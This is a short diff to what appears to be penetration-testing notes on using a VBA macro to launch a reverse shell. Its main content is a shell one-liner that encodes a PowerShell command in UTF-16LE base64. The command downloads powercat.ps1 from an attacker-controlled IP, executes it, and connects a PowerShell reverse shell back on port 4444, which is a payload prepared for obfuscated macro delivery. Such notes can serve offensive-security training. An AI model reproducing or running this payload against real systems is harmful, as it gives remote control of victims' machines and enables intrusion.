@@ -1,6 +1,6 @@
 # VBA Macro to launch revshell
 
-## Encode powercat download with base64 (UTF16-LE)
+## Encode powercat download and exec with base64 (UTF16-LE)
 
 ```
 echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.x/powercat.ps1');powercat -c 192.168.119.x -p 4444 -e powershell" | iconv --to-code UTF-16LE | base64 -w0
